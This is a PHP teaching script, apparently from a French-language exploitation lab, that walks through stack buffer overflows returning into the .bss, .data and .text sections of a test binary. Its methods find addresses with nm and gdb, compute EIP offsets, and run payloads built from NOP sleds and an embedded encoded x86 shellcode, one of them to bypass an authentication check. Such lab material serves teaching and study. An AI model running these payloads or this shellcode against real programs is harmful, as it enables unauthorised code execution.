<?php

class ret2code extends bin4linux{
		public function __construct($bin_bof) {
			parent::__construct($bin_bof);
			$name = __CLASS__;
			$rep_path = "$this->dir_tmp/$name";
			if (!file_exists($rep_path)) $this->create_folder($rep_path);
		}

// info variables -- All global and static variable names

// =============================== BSS ========================================================
function ret2code2bss() {
	$this->chapitre("Return to .BSS");
	$this->article("La Zone bss", " regroupe les données globales non-initialisées");
	$this->bin2bss2size();$this->pause();
	$this->bin2bss2content();$this->pause();
	$this->titre("Adresse de la variable globalbuf");
	$this->ssTitre("Via nm");
	$this->requette("nm $this->file_path | grep globalbuf");
	$this->pause();
	$this->ssTitre("Via le script source");
	$ret = trim($this->req_ret_str("$this->file_path AAAAAAAA | grep '0x' | cut -d : -f 2"));$this->pause();
	$this->ssTitre("Via gdb");
	$this->requette("gdb -q --batch -ex \"print &globalbuf\" $this->file_path");
	$this->requette("gdb -q --batch -ex \"info symbol $ret\" $this->file_path");
	$this->pause();

	$overflow = $this->bin2fuzzeling("");
	$this->pause();
	$offset_eip = $this->bin2offset4eip($overflow);
	
	// date
	$shellcode = '\xb8\xe7\xc2\xdf\xef\xda\xd8\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x0b\x31\x45\x12\x83\xc5\x04\x03\xa2\xcc\x3d\x1a\x46\xda\x99\x7c\xc4\xba\x71\x52\x8b\xcb\x65\xc4\x64\xbf\x01\x15\x12\x10\xb0\x7c\x8c\xe7\xd7\x2d\xb8\xfd\x17\xd2\x38\x9a\x76\xa6\x5d\x62\x2e\x15\x14\x83\x1d\x19';
	system("echo '$shellcode' > $this->file_rep/shellcode4ret2code4bss.hex");
	$shellcode_file = new file("$this->file_rep/shellcode4ret2code4bss.hex");
			
	$size_shellcode = $shellcode_file->shellcode2size();
	echo "\nTaille Du SHELLCODE: $size_shellcode bytes\n";
	$nops = ($offset_eip - $size_shellcode);
	$addr = $this->hex2rev_32($ret);
	$this->article("Explication", "Retour vers global Varial qui elle pointe vers argv[1]");
	$query = "$this->file_path `python -c print'\"\\x90\"*$nops+\"$shellcode\"+\"$addr\"'`";
	$this->requette($query);
	$this->pause();
	$this->notify("END .BSS section");

}

// ========================= END BSS ========================================================

// ======================== ZONE DATA ================================================
function ret2code2data() {
	$this->chapitre("Return to .DATA");
	$this->article("La zone data", " stocke les données globales statiques initialisées (dont la valeur est fournie lors de la compilation)");
	$overflow = 100;

	$this->ssTitre("exec Programme");
	$this->requette("$this->file_path rohff");
	$this->note("la variable shellcode_date n'est appelée nulle part dans l'execution du programme");
	$this->bin2data2size();$this->pause();
	$this->bin2data2content();$this->pause();

	$this->titre("Adresse de la variable shellcode_data");
	$this->ssTitre("Via le script source");
	$ret = trim($this->req_ret_str("$this->file_path AAAAAAAA | grep '0x' | cut -d : -f 2"));$this->pause();
	$this->ssTitre("Via gdb");
	$this->requette("gdb -q --batch -ex \"print &shellcode_data\" $this->file_path");
	$this->requette("gdb -q --batch -ex \"info symbol $ret\" $this->file_path");
	$this->ssTitre("Via nm");	$this->requette("nm $this->file_path | grep shellcode_data");	$this->pause();
	$offset_eip = $this->bin2offset4eip($overflow);
	$addr = $this->hex2rev_32($ret);
	$query = "$this->file_path `python -c print'\"A\"*$offset_eip+\"$addr\"'`";
	$this->requette($query);
	$this->pause();
	$this->notify("END .data Section");
}

// ======================== END ZONE DATA ================================================

// =========================== ZONE TEXT ===========================================
function ret2code2text() {
	$this->chapitre("Return to .TEXT");
	$this->titre("Outrepasser une authentification -> return to text");
	$this->ssTitre("Exec Our Programme");
	$this->requette("$this->file_path '0123456789' ");
	$this->pause();
	$this->requette("$this->file_path AAAABBBBCCCC");
	$this->requette("$this->file_path AAAABBBBCCCCDDDDABCD");
	$this->article(".Text", "La zone text contient les instructions du programme. 
			Cette région est en lecture seule. 
			Elle est partagée entre tous les processus qui exécutent le même fichier binaire. 
			Une tentative d'écriture dans cette partie provoque une erreur segmentation violation. -> segfault, cette zone n'est pas influençables par l'ASLR ni NX.");
	$this->pause();

	$this->bin2text2size();$this->pause();
	$this->bin2text2content();$this->pause();
	$this->titre("Adresse de la fonction secret");
	$ret = trim($this->req_ret_str("$this->file_path AAAAAAAA | grep '0x' | cut -d : -f 2"));
	$this->ssTitre("Via gdb");
	$this->requette("gdb -q --batch -ex \"print &secret\" $this->file_path");
	$this->requette("gdb -q --batch -ex \"info symbol $ret\" $this->file_path");
	$this->ssTitre("Via nm");	$this->requette("nm $this->file_path | grep secret");
	$this->ssTitre("Via le script source");$this->requette("$this->file_path AAAAAAAA");
	$this->pause();
	$overflow = $this->bin2fuzzeling("");$this->pause();
	// $offset_eip = trouve_offset($this->file_path,$overflow) ;
	$offset_eip = $this->bin2offset4eip($overflow);
	$this->ssTitre("ESP & EBP");
	// diff_esp_ebp();pause(); // ok
	$ret = $this->hex2rev_32($ret);
	$query = "$this->file_path `python -c print'\"A\"*$offset_eip+\"$ret\"'`";
	$this->ssTitre("Sous Linux 32 Bits");
	$this->ssTitre("Exec Programme");
	$this->requette("$this->file_path 123456");
	$this->ssTitre("Exec Programme with our payload ");
	$this->cmd("localhost", $query);
	$this->article("Note", "Dot it a la main,php recoit un signal segfault du prog qui a lance d'ou l'arret de l'execution de la commande system -> on test en cmd");
	$this->pause();
	$this->notify("End .text");
}

// =========================== END ZONE TEXT ===========================================
}


?>